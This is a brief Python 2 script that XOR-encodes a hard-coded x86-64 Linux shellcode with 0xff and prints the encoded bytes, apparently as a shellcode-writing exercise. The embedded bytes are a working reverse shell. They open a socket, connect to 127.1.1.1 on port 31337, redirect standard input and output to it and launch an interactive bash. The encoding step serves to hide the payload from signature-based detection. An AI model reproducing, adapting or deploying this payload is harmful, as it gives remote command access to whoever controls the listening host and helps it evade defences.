#!/usr/bin/env python

import sys

shellcode = bytearray("\x48\x31\xc0\xb0\x29\x48\x31\xff\x40\x80\xc7\x02\x48\x31\xf6\x48\x83\xc6\x01\x48\x31\xd2\x0f\x05\x48\x89\xc7\x48\x31\xc0\x50\xc7\x44\x24\xfc\x7f\x01\x01\x01\x66\xc7\x44\x24\xfa\x7a\x69\x89\x44\x24\xf6\xc6\x44\x24\xf8\x02\x48\x83\xec\x08\x48\x31\xc0\xb0\x2a\x48\x89\xe6\x48\x31\xd2\x48\x83\xc2\x10\x0f\x05\x48\x31\xc0\xb0\x21\x48\x31\xf6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\xb0\x21\x48\xff\xc6\x0f\x05\x48\x31\xc0\x50\x48\x31\xdb\x48\xbb\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x53\x48\xbb\x2f\x2f\x2f\x2f\x2f\x62\x69\x6e\x53\x48\x89\xe7\x50\x66\x68\x2d\x69\x48\x89\xe6\x50\x56\x57\x48\x89\xe6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05")

encodedShellcode = ""

for i in shellcode:
  xorEncoded = i^0xff
  encodedShellcode += "0x%02x," % xorEncoded

print 'Encoded shellcode: %s' % encodedShellcode
sys.exit(0)
